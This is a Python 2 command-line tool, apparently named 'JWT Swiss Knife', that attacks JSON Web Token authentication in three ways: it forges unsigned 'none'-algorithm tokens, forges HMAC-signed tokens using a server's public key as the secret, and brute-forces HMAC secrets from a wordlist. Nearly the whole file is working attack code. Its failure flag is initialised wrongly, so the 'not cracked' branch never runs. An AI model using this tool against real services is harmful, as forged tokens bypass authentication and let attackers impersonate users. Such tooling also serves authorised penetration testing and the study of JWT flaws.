#!/usr/bin/python

import json
import sys
import argparse
from termcolor import colored
import jwt

def output_banner():
	print colored(
"""    
       dP dP   dP   dP d888888P    .d88888b  dP   dP   dP dP .d88888b  .d88888b     dP     dP 888888ba  dP  88888888b  88888888b 
       88 88   88   88    88       88.    "' 88   88   88 88 88.    "' 88.    "'    88   .d8' 88    `8b 88  88         88        
       88 88  .8P  .8P    88       `Y88888b. 88  .8P  .8P 88 `Y88888b. `Y88888b.    88aaa8P'  88     88 88 a88aaaa    a88aaaa    
       88 88  d8'  d8'    88             `8b 88  d8'  d8' 88       `8b       `8b    88   `8b. 88     88 88  88         88        
88.  .d8P 88.d8P8.d8P     88       d8'   .8P 88.d8P8.d8P  88 d8'   .8P d8'   .8P    88     88 88     88 88  88         88        
 `Y8888'  8888' Y88'      dP        Y88888P  8888' Y88'   dP  Y88888P   Y88888P     dP     dP dP     dP dP  dP         88888888P   v1.0 
                                                                                                                                                                                 
\n""", "blue", attrs = ['bold'])

	print colored("Written by Oz A. @ CyberInt HQ\n", "red", attrs = ['bold'])

	print colored("Credit to Tim McLean for his blogpost about JWT vulnerabilities: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/\n\n", "grey", attrs = ['bold'])

def create_none_token():
        print colored("[+] Creating \"none\" token..", "green", attrs = [])
        jwt_body = args.body
        jwt_signature = ""

        token = jwt.encode(json.loads(jwt_body), "", algorithm='none')
        print colored("[+] Generated token successfully!", "green", attrs = [])
        print colored("[+] Generated JWT: ", "green", attrs = ['bold']) + colored(token, "cyan", attrs = [])
	print colored("[+] Quitting..", "magenta", attrs = ['bold'])

def create_HS_token():
        print colored("[+] Creating "+args.alg+" token using public key signing..", "green", attrs = [])
        jwt_body = args.body
        pk_file = open(args.pk, 'r')
        jwt_pk = pk_file.read()
	algo = args.alg

        token = jwt.encode(json.loads(jwt_body), jwt_pk, algorithm=algo)
        print colored("[+] Generated token successfully!", "green", attrs = [])
        print colored("[+] Generated JWT: ", "green", attrs = ['bold']) + colored(token, "cyan", attrs = [])
	print colored("[+] Quitting..", "magenta", attrs = ['bold'])
        pk_file.close()

def brute_HS256():
	print colored("[+] Initializing HMAC secret bruteforce..", "green", attrs = [])
	token = args.jwtoken
	filep = args.secrets
	algo = args.alg
	f1 = True

	with open(filep, 'r') as secrets_list:
		for sec in secrets_list:
			secret = sec.replace("\n", "", 1)
			print colored("[+] Attempting to crack JWT token using - ", "green", attrs = []) + colored(secret, "red", attrs = []) + colored(" as HMAC secret..", "green", attrs = [])		
			try:
				jwt.decode(token, secret, algorithms=[algo])
				print colored("[+] JWT token secret cracked using: ", "green", attrs = ['bold']) + colored(secret, "red", attrs= ['bold', 'underline'])
				print colored("[+] Quitting..", "magenta", attrs = ['bold'])
				f1 = True
				break
			except:
				pass
		
	if f1 == False: 
		print colored("[+] JWT token secret was not cracked.. Maybe try another wordlist..", "green", attrs = ['bold'])
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])


def main():     
	parser = argparse.ArgumentParser()
        parser.add_argument("-method", help = "Choose 1. for \"None\" algorithm vulnerability\nChoose 2. for Asymmetric key vulnerability\nChoose 3. for HMAC secret bruteforce", type=int, required=True)
        parser.add_argument("-body", help = "The JWT token body in JSON format", type=str, required=False)
        parser.add_argument("-pk", help = "Public key (.pem format) to use for signature encryption using HMAC", required=False)
	parser.add_argument("-jwtoken", help = "The JWT token that will be used in the process of bruteforcing the HMAC secret", type=str, required=False)
	parser.add_argument("-secrets", help = "Exact path to the list of secrets (wordlist) that will be used to bruteforce the HMAC secret", type=str, required=False)
	parser.add_argument("-alg", help = "The JWT token algorithm (e.g. HS256, HS512..) to be used for decrypting the hash", type=str, required=False)
	global args
        args = parser.parse_args()

        output_banner()

	### None Block ###
	if args.method == 1 and args.body == None:
		print colored("[-] JWT token body is required in JSON format..", "magenta", attrs = ['bold'])
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])
		exit()

	if args.method == 1 and args.body != None:
		create_none_token()
                exit()


	### Asymmetric Vuln Block ###
	if args.method == 2 and args.body == None:
		print colored("[-] JWT token body is required in JSON format..", "magenta", attrs = ['bold'])  
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])      
		exit()	

	if args.method == 2 and args.body != None and args.pk == None:
		print colored("[-] Public key is required in .pem format for method 2..", "magenta", attrs = ['bold'])
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])
		exit()

	if args.method == 2 and args.body != None and args.pk != None and args.alg == None:
		print colored("[-] Specifying either HS256 or HS512 is mandatory for method 2..", "magenta", attrs = ['bold'])
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])
		exit()

	if args.method == 2 and args.body != None and args.pk != None and args.alg != None:
		create_HS_token()
		exit()
		

	### HMAC Brute Block ###
	if args.method == 3 and args.jwtoken == None:
		print colored("[-] JWT token is needed for for method 3..", "magenta", attrs = ['bold'])
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])
		exit()

	if args.method == 3 and args.jwtoken != None and args.secrets == None:
		print colored("[-] A text file containing secrets to be used for bruteforcing the HMAC secret is needed for method 3..", "magenta", attrs = ['bold'])
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])
		exit()

	if args.method == 3 and args.jwtoken != None and args.secrets != None and args.alg == None:
		print colored("[-] The -alg flag is mandatory for method 3..", "magenta", attrs = ['bold'])
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])
		exit()

	if args.method == 3 and args.jwtoken != None and args.secrets != None and args.alg != None:
		brute_HS256()
		exit()

	else:
		print colored("[-] No such method..", "magenta", attrs = ['bold'])
		print colored("[+] Quitting..", "magenta", attrs = ['bold'])
		exit()




if __name__ == '__main__':
        main()


